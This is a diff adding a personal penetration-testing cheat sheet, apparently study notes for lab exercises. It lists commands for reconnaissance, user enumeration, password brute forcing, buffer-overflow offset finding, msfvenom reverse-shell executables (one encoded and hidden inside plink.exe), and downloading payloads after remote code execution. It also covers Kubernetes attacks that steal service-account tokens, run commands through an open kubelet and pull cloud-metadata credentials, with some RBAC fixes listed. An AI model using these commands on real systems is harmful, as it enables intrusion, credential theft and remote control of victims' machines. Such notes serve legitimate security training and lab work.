@@ -1,0 +1,194 @@
+----------------------------------------------------------------LINUX-------------------------------------------------------------------------------------------
+systemctl <status/start/stop> <ssh/apache2>
+systemctl <enable/disable> <ssh/apache2> - for boot persistance
+netstat -tulpn (only listening sockets) / netstat -tuapn
+
+cat index.html | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
+
+cat access_log.txt | uniq -c - count similar lines
+
+Eliminating spaces before cut-ing:
+cat file | tr -s ' ' | cut -d ' ' -f 8
+Removing stuff:
+cat file | tr -d ':'
+
+;Bash for loop example:
+for username in $(cat /usr/share/wordlists/fern-wifi/common.txt); do python cve_2018_15473_confirmed.py 10.x.x.x $username; done
+
+-----------------------------------------------------------------BASH------------------------------------------------------------------------------------------
+1) Dont forget spaces inside the if condition
+2) A big no-no when assigning a variable - no spaces allowed
+3) $var might not work inside single quotes - try double quotes
+
+
+
+-------------------------------------------------------------------RECON---------------------------------------------------------------------------------------
+Google Hacks:
+site:amazon.com -site:www.amazon.com
+intitle:"netbotz appliance" -filetype:pdf
+
+theHarvester:
+(from theHarvester git repo - this is v3) python3 theHarvester.py -d watchdox.com -b yahoo
+
+Shodan
+shodan init <APIKEY> (from your account)
+shodan host amazon.com
+shodan search 
+-------------------------------------------------------------ENUMERATION-----------------------------------------------------------------------------------
+DNS:
+gobuster -m dns -t 100 -u google.com -w /usr/share/wordlists/metasploit/namelist.txt
+
+SMTP:
+user enumeration:
+smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t 192.168.2.4
+
+verifying whether user exists:
+smtp-user-enum -M VRFY -u root -t 192.168.2.4
+
+Automation across the network:
+python ~/exploits/smtp/smtp_scanner.py -U /usr/share/wordlists/g00fb4ll/usernames.txt -T targetlist.txt
+
+OpenSSH:
+cve-2018-15473:
+python cve_2018_15473_confirmed.py --userList /usr/share/wordlists/g00fb4ll/usernames.txt 10.x.x.x --outputFile out
+
+SNMP:
+nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt
+Finding hosts with onesixtyone:
+onesixtyone -c community -i ../smtp/targetlist.txt -d
+
+Enumerating the Entire MIB Tree
+root@kali:~# snmpwalk -c public -v1 10.11.1.219
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP "
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (66160) 0:11:01.60
+...
+Enumerating Windows Users:
+root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
+
+Enumerating Running Windows Processes:
+root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
+
+Enumerating Open TCP Ports:
+root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
+
+Enumerating Installed Software:
+root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
+------------------------------------------------------------------NMAP------------------------------------------------------------------------------------------
+Parameters:
+-A
+-O
+-T1..5
+-p-
+
+Comprehensive scan:
+nmap -sS -sU -T4 -A -vv -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script="default or (discovery and safe)" 10.x.x.x
+
+Through the proxy:
+nmap --proxy http://192.168.233.150:3128 -Pn 192.168.233.150
+
+-----------------------------------------------------------------WEB SCAN--------------------------------------------------------------------------------------
+dirbuster
+or
+gobuster -e -k -u http://10.23.58.40:31982/ -w /usr/share/wordlists/g00fb4ll/dirbuster_directory-list-2.3-medium.txt -x php,html
+(-e - extended mode, print full urls; -k - skip SSL cert verification)
+or - gobuster for a list of targets/ports
+for port in $(cat ports.txt); do gobuster -e -k -u <hostname>:$port/ -w /usr/share/wordlists/dirb/common.txt; done
+
+Fuzzing for path traversal:
+
+
+-----------------------------------------------------------------PASSWORDS------------------------------------------------------------------------------------
+Running cewl on site page:
+cewl http://10.10.10.150:80 -m 4 -d 3 --with-numbers --meta -v -w curling_wordlist.txt
+(-m is minimal word length, -d is the spider depth, -a is parsing the meta as well)
+
+Mutating with John:
+john --wordlist=curling_wordlist.txt --rules --stdout > mutated.txt
+
+RDP bruteforcing:
+ncrack -vv --user offsec -P password-file.txt rdp://10.x.x.x
+
+SSH:
+hydra -l root -P password-file.txt 10.11.1.219 ssh
+medusa -u root -P /usr/share/wordlists/g00fb4ll/top-1000-passwords.txt -h 10.x.x.x -M ssh -t 5
+
+HTTP forms:
+hydra -P password-file.txt -v 10.11.1.219 snmp
+
+
+--------------------------------------------------------------------PAYLOADS----------------------------------------------------------------------------------------
+Setting up unique string:
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3A...
+
+Finding the offset:
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
+[*] Exact match at offset 260
+
+Translating the instruction to hex code:
+root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+00000000 FFE4 jmp esp
+nasm >
+
+Reverse tcp meterpreter piggybacking on some program:
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+
+Reverse HTTPS meterpreter:
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe
+-b - specifying disallowed characters
+
+--------------------------------------------------------------------FILE TRANSFER-----------------------------------------------------------------------------------
+Downloading initial payload after getting basic RCE:
+wget http://10.23.58.43:8000/kubectl -O kubectl
+wget http://10.23.58.43:8000/msbin -O msbin
+curl -O http://10.23.58.43:8000/kubectl
+curl -O http://10.23.58.43:8000/msbin
+curl http://10.23.58.43:8000/kubectl -o kubectl
+curl http://10.23.58.43:8000/kubectl -o msbin
+
+
+---------------------------------------------------------------------PRIVESC----------------------------------------------------------------------------------------
+
+Run sudo killer to look for sudo misconfigurations:
+./sudo_killer.sh -c -e -r report.txt -p /tmp
+
+
+--------------------------------------------------------------------ATTACKING KUBERNETES----------------------------------------------------------------------------
+meterpreter> upload /var/www/html/payloads_for_download/kubectl_64bit
+cat /run/secrets/kubernetes.io/namespace
+cat /run/secrets/kubernetes.io/token
+
+List pods:
+./kubectl_64bit --token='cat /run/secrets/kubernetes.io/serviceaccount/token' --certificate-authority='/run/secrets/kubernetes.io/serviceaccount/ca.crt' --server=https://10.23.58.40:6443 get pods
+
+Weaknesses and misconfigurations based on https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/
+1. Service account token is mounted by default in compromised Frontend pod => user RBAC to create frontend SA that cant exec into other pods, only listing pods if needed
+2. Frontend pod's SA can list pods (get pods)
+3. Frontend pod's SA can perform lateral movement through exec-ing into another pod = > limit with RBAC
+4. Redis pod SA can create another pod on the claster => use RBAC: create SA "redis", create role "only list pods", create binding between those two and redeploy redis pods as "Redis" SA
+5. Redis running as root on host Node2
+6. ssh is open on the Node2 and it accepts connections with sudo users
+Extra: 
+(1) pod security policy preventing volume mounting; 
+(2) pod security policy preventing containers running as root as in redis case
+(3) create network policy to limit outside traffic from backend pods
+Weaknesses and misconfigurations based on https://www.youtube.com/watch?v=tlk4q3UzI5E&feature=youtu.be:
+1. Service account token is mounted by default in compromised Wordpress pod => user RBAC to create wordpress SA that cant exec into other pods, only listing pods if needed
+2. Wordpress pod's SA can list pods (get pods) => use RBAC to limit
+3. Wordpress pod's SA can perform lateral movement through exec-ing into another pod => use RBAC to limit: create wordpress SA and bind it to the role that only has necessary perms 
+4. Mysql code cant list pods but can list nodes => RBAC to the rescue
+5. Open kubelet port on master node (kubelet is listening on 10250 or 10255) 
+	- that we can use to list pods - including pods from another namespace
+	- apparently curling to kubelet allows command execution in containers: curl -sk https://x.x.x.x:10250/run/dev/dev-pod/dev-web -d "cmd=id"
+	=> run kubelet with --anonymous-auth=false
+	=> Egress NetworkSecurityPolicy from mysql and other marketing pods
+6. Dev-web pod is not allowed to list pods but allowed to list secrets
+7. Access to metadata API from the dev namespace pod. Moreover, metadata API can list credentials at curl 169.254.169.254/latest/meta-data/iam/security-credentials
+
+Questions:
+1. How do you know kube-apiserver ip address from the pod? By dumping env and looking at KUBERNETES_PORT_443_TCP variable - it should hold API server ip:port
+2. Getting "error: You must be logged in to the server (Unauthorized)" for the get pods command
+
+
